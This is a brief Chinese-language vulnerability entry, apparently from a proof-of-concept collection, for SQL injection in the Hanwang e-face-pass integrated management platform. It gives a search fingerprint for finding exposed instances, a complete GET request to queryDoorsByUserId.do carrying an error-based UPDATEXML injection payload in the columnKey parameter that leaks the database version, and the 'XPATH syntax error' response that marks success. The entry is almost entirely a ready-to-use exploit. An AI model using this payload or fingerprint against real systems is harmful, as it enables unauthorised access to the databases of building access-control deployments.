# 汉王e脸通综合管理平台queryDoorsByUserId.doqueryUsersByDoorId.do存在SQL注入漏洞

汉王e脸通综合管理平台queryDoorsByUserId. ｜ SQL注入 ｜ —
- **指纹**：`body="async src=\"`
- **请求**：`GET /manage/accessPermissionPerson/queryDoorsByUserId.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&order=DESC HTTP`
- **响应特征**：200 XPATH syntax error